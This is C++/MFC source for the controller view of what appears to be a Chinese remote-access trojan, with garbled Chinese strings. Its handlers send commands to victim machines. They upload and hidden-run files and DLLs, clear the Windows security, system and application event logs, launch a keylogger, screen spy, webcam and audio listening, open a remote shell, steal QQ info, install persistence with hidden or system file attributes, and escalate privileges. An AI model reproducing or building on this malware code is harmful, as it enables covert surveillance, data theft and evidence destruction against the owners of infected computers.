	ofn.lpstrFile[0] = _T('\0');
	ofn.nMaxFile = sizeof(FileOpenPath);
	ofn.lpstrFilter = _T("����ļ�(*.dll*)\0*.dll\0\0");
	ofn.nFilterIndex = 1;
	ofn.lpstrFileTitle = NULL;
	ofn.nMaxFileTitle = 0;
	ofn.lpstrInitialDir = NULL;
	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
	if (!GetOpenFileName(&ofn))
	{
		return NULL;
	}
	
	char *strFilen = FileOpenPath;
	return strFilen;
}

void CClientView::OnStartHide() 
{
	// TODO: Add your command handler code here
	CString strTitle;
	
	if (MessageBox("�ϴ���Զ��ϵͳTemp�ļ����£������ļ�����ʱ��\n�����ĵȺ�", "��ʾ! ", MB_YESNO|MB_ICONWARNING) == IDNO)
		return;
	
	char *lpFilePath = OnOpenFileName();
	if(lpFilePath == NULL)
		return ;
	
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(lpFilePath,"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("�ļ���ȡʧ�ܣ�");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	char	*lpFileExt = strrchr(lpFilePath, '.');
	int		nPacketLength = 1 + strlen(lpFileExt) + 1 + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_HIDE;
	memcpy(lpPacket + 1, lpFileExt, strlen(lpFileExt) + 1);
	memcpy(lpPacket + 1 + strlen(lpFileExt) + 1, data, size);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
}

void CClientView::OnStartShow() 
{
	// TODO: Add your command handler code here
	CString strTitle;
	
	if (MessageBox("�ϴ���Զ��ϵͳTemp�ļ����£������ļ�����ʱ��\n�����ĵȺ�", "��ʾ! ", MB_YESNO|MB_ICONWARNING) == IDNO)
		return;
	
	char *lpFilePath = OnOpenFileName();
	if(lpFilePath == NULL)
		return ;
	
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(lpFilePath,"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("�ļ���ȡʧ�ܣ�");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	char	*lpFileExt = strrchr(lpFilePath, '.');
	int		nPacketLength = 1 + strlen(lpFileExt) + 1 + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_SHOW;
	memcpy(lpPacket + 1, lpFileExt, strlen(lpFileExt) + 1);
	memcpy(lpPacket + 1 + strlen(lpFileExt) + 1, data, size);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
}

void CClientView::OnStartNRun() 
{
	// TODO: Add your command handler code here
	CString strTitle;
	
	if (MessageBox("�ֶ��ϴ������Զ��ϵͳTemp�ļ����£�\n�����ĵȺ�", "��ʾ! ", MB_YESNO|MB_ICONWARNING) == IDNO)
		return;
	
	char *lpFilePath = OnOpenFileDll();
	if(lpFilePath == NULL)
		return ;
	
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(lpFilePath,"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("�ļ���ȡʧ�ܣ�");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	char	*lpFileExt = strrchr(lpFilePath, '.');
	int		nPacketLength = 1 + strlen(lpFileExt) + 1 + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_NRUN;
	memcpy(lpPacket + 1, lpFileExt, strlen(lpFileExt) + 1);
	memcpy(lpPacket + 1 + strlen(lpFileExt) + 1, data, size);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
}

void CClientView::OnCleanEvent()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnCleanSystem() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE	bToken = COMMAND_CLEAN_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CClientView::OnCleanSecurity() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE	bToken = COMMAND_CLEAN_SECURITY;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CClientView::OnCleanApplication() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE	bToken = COMMAND_CLEAN_APPLICATION;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CClientView::OnRenameRemark() 
{
	// TODO: Add your command handler code here
	
	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format(_T("��������(%s)�ı�ע"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle = _T("��������������ע");
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("�������µı�ע:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 10, dlg.m_str);
	}
	
	delete[] lpPacket;		
}

void CClientView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while (pos) 
	{
		int i = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));	
	}
}

struct MSGBOX
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}MsgBox;

void CClientView::OnShowMsg()   //��Ϣ����
{
	// TODO: Add your command handler code here
	
	CMsgBox dlg;
remsg:
	if(dlg.DoModal() != IDOK) 
		return;
	
	if ((strlen(dlg.m_Title) < 1) | (strlen(dlg.m_Text) < 1))
	{
		MessageBox("�����뷢�ͱ��⼰����!!!", "��ʾ", MB_OK | MB_ICONWARNING);
		goto remsg;
	}
	
	ZeroMemory(&MsgBox,sizeof(MSGBOX));
	strcpy(MsgBox.Title,dlg.m_Title.GetBuffer(0));
	strcpy(MsgBox.szText,dlg.m_Text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton|dlg.m_msgIcon;
	
	BYTE	*bToken = new BYTE[sizeof(MSGBOX)+1];
	bToken[0]= COMMAND_SHOW_MSG;
	memcpy(&bToken[1],&MsgBox,sizeof(MSGBOX));
	
	SendSelectCommand(bToken, sizeof(MSGBOX)+1);
	delete bToken;
	goto remsg;
}

////////////////////////////////////////������
void CClientView::OnIPList() 
{
	// TODO: Add your command handler code here
	CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("�ı��ļ�|*.txt"), NULL);
	if (dlg.DoModal() != IDOK)
		return;
	CFile file;
	char ip[50] = {0};
	if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	{
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		while (pos)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			CString strTitle;
			strTitle.Format(_T("%s%s"), m_pListCtrl->GetItemText(nItem, 2), _T("\r\n"));
			file.Write(strTitle, strlen(strTitle));
		}
		file.Close();
		AfxMessageBox(_T("IP�б����ɹ�!"));
	}
}

void SetClipboardText(CString &Data)
{
	if(OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		MoveMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CClientView::OnIP() 
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 3);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);
}

void CClientView::OnBeiZhu() 
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 11);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CClientView::OnDiLiXinXi() 
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 0);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CClientView::OnAll() 
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		Name = "";
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		for(int i = 0; i < m_pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
		{
			Name += m_pListCtrl->GetItemText(nItem, i);
			Name += " ";
		}
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CClientView::OnSysinfo() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSINFO;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnRegedit() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	// 	SendDllCommand("BRemoteRegedit",NULL,0);	
	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken,sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CClientView::OnChat() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CHAT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnQQInfo()
{
	BYTE	bToken = COMMAND_QQINFO;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CClientView::OnOpenSysInfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSysInfo	*dlg = new CSysInfo(this, m_iocpServer, pContext);
	
	// Settings������Ϊ����
	dlg->Create(IDD_SYSINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);
	//Settings������Ϊ����
	dlg->Create(IDD_REG_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenSerManagerDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSerManager	*dlg = new CSerManager(this, m_iocpServer, pContext);
	
	// Settings������Ϊ����
	dlg->Create(IDD_SERMANA, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SERMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenChatDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CChat	*dlg = new CChat(this, m_iocpServer, pContext);
	
	// Settings������Ϊ����
	dlg->Create(IDD_CHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = CHAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenQQInfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CQQInfoDlg	*dlg = new CQQInfoDlg(this, m_iocpServer, pContext);
	
	// Settings������Ϊ����
	dlg->Create(IDD_QQINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = QQINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CClientView::OnModifyListYN(LPARAM lParam,CHAR *strp)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	if (pContext == NULL)
        return ;
	
	DWORD iCount = m_pListCtrl->GetItemCount();
	
	CClientView* pView = NULL;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int newnum = 0 ;
	for (int k = 0 ; k < nTabs; k++ )
	{
		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
		int num = pView->m_pListCtrl->GetItemCount();
		newnum = newnum + num ;//��ȡ�ܹ�����
	}
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		int nCnt = pView->m_pListCtrl->GetItemCount();
		for ( int i = 0; i < nCnt; i++)
		{
			ClientContext *pContext1 = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
			if (pContext == pContext1)
			{
				pView->m_pListCtrl->SetItemText(i, 11, strp);
				break;
			}
		}
	}
}

LRESULT CClientView::OnModifyList(WPARAM wParam, LPARAM lParam)
{	
	OnModifyListYN(lParam," ��");
	return 0;
}

LRESULT CClientView::OnNoModifyList(WPARAM wParam, LPARAM lParam)
{
	OnModifyListYN(lParam," -/-");
	return 0;
}

void CClientView::OnSortProcess() 
{
	CInputDialog	dlg;
	dlg.Init(_T("����ɸѡ"), _T("������Ҫɸѡ�Ľ���:(.exe)"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T(".exe")) == -1)
	{
		MessageBox(_T("��������Ʋ��Ϸ�"), _T("����"));
		return;
	}
	
	int		nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR)+1;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SORT_PROCESS;
	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CClientView::OnSortWindow() 
{
	CInputDialog	dlg;
	dlg.Init(_T("����ɸѡ"), _T("������Ҫɸѡ�ı���ؼ���:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (lstrlen(dlg.m_str) < 1)
	{
		MessageBox(_T("��������Ʋ��Ϸ�"), _T("����"));
		return;
	}
	
	int		nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR)+1;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SORT_WINDOW;
	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CClientView::OnChongZhi() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 14, " -/-");
	}
}

void CClientView::OnMap() 
{
	// TODO: Add your command handler code here
	// TODO: Add your control notification handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	ClientContext* pContext;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		pContext= (ClientContext*)m_pListCtrl->GetItemData(nItem);
		
		CMapDlg	*dlg = new CMapDlg(this, nItem, pContext);
		// Settings������Ϊ����
		dlg->Create(IDD_MAP_DIALOG, GetDesktopWindow());
		//dlg->ShowWindow(SW_SHOW);
		
		pContext->m_Dialog[0] = IDD_MAP_DIALOG;
		pContext->m_Dialog[1] = (int)dlg;
	}
}

void CClientView::OnLButtonDblClk(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	TestDbClick();
	CListView::OnLButtonDblClk(nFlags, point);
}

// ����˫���¼�
void CClientView::TestDbClick(void)
{
	//operate=1;
	switch(operate)
	{
	case 0:
		OnFileManager();        //�ļ�����
		break;
	case 1:
		OnKeyboard();           //���̼�¼
		break;
	case 2:
		OnScreenspy();          //Զ������
		break;
	case 3:
		OnSystem();             //ϵͳ����
		break;
	case 4:
		OnWebcam();             //��Ƶ�鿴
		break;
	case 5:
		OnAudioListen();        //��������
		break;
	case 6:
		OnRemoteShell();        //Զ���ն�
		break;
	case 7:
		OnSysinfo();            //��������
		break;
	case 8:
		OnSerManager();         //�������
		break;
	case 9:
		OnRegedit();            //��ע���
		break;
	case 10:
		OnChat();               //Զ�̽�̸
		break;
	case 11:
		OnMap();                //Զ�̶�λ
		break;
	}
}

struct START
{
	CHAR Startname[200];
	WORD FileAttribute;      //�ļ�����	
	WORD Enlarge;            //��װ����
}Start;
void CClientView::OnStart() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		MessageBox("��ѡ��������");
		return ;	
	}
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if (pos==NULL)
		return;
	
	if (MessageBox(_T("ȷ��д�������𣿰�ȫ������ܻ����أ�����"), _T("��ʾ"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	
	CStart dlg;
one:
	if(dlg.DoModal() != IDOK) 
		return;
	
	if ((strlen(dlg.m_StartName) < 1))
	{
		MessageBox("�������ļ�����!!... ", "��ʾ! ", MB_OK | MB_ICONWARNING);
		goto one;
	}
	
	CString rString = dlg.m_strCur;
	
	ZeroMemory(&Start,sizeof(START));
	strcpy(Start.Startname,dlg.m_StartName.GetBuffer(0));
	
	
	
	if(rString == "����")
		Start.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if(rString == "����")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN;
	
	if(rString == "ϵͳ")
		Start.FileAttribute = FILE_ATTRIBUTE_SYSTEM;
	
	if(rString == "ֻ��")
		Start.FileAttribute = FILE_ATTRIBUTE_READONLY;
	
	if(rString == "����+ϵͳ")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	
	if(rString == "����+ϵͳ+ֻ��")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;
	
	Start.Enlarge=(WORD)dlg.m_Enlarge;
	
	
	BYTE	*bToken = new BYTE[sizeof(START)+1];
	bToken[0]= COMMAND_START;
	memcpy(&bToken[1],&Start,sizeof(START));
	
	SendSelectCommand(bToken, sizeof(START)+1);
	delete bToken;
	goto one;
	
}
void CClientView::OnScreen()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_Screensp;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}
void CClientView::OnMenuitemProxyMap() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	// 	SendDllCommand("BRemoteScreen",NULL,0);
	
	BYTE	bToken = COMMAND_PROXY_MAP;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}
void CClientView::OnElevate_Privileges() //WIN7����Ȩ��
{
	if(MessageBox("�⼦��UAC�ȼ��·ǹ���Ա�˻���Ȩ�ᵯ��ѯ�ʿ�\r\n�Ƿ���Ȩ��", "ע��", MB_ICONQUESTION|MB_YESNO) != IDYES)
		return ;
	
	BYTE	bToken = COMMAND_OnElevate_Privileges;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CClientView::OnReStartexp() //����Exp
{
	BYTE	bToken = COMMAND_ReStart_Exp;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CClientView::OnIEQC() 
{
	BYTE	bToken = COMMAND_ReStart_ieqc;
	SendSelectCommand(&bToken, sizeof(BYTE));
}